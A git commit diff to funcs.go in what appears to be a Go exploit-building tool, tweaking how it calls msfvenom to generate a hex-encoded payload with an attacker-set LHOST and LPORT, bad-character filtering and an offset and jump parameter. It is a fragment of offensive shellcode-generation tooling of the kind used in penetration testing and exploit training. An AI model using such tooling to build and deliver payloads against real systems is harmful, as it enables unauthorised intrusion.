03eec8fbc8b32f19ce4e378d598ed4862dae3958
Chris <tacashix@gmail.com>
2021-02-02 12:36:40 +0100

    testing

--- funcs.go
+++ funcs.go
@@ -171,7 +171,7 @@ func generate(c Config, off int, jmp string, bad string, ptype string, send bool
 	venomCmd := path.Join(c.MsfPath, "msfvenom")
 	//venomArgs := fmt.Sprintf("-p %s LHOST=%s LPORT=%d EXITFUNC=thread -b \"%s\" -f hex -o payload.txt", ptype, ip, port, bad)
 	//out, err := exec.Command(venomCmd, venomArgs).Output()
-	cmd := exec.Command(venomCmd, fmt.Sprint("-p "+ptype), fmt.Sprint("LHOST="+ip), fmt.Sprintf("LPORT=%d", port), "EXITFUNC=thread", fmt.Sprintf("-b \"%s\"", bad), "-fhex", "-o payload.txt")
+	cmd := exec.Command(venomCmd, "-p", ptype, fmt.Sprint("LHOST="+ip), fmt.Sprintf("LPORT=%d", port), "EXITFUNC=thread", fmt.Sprintf("-b \"%s\"", bad), "-fhex", "-o payload.txt")
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
 	err := cmd.Run()
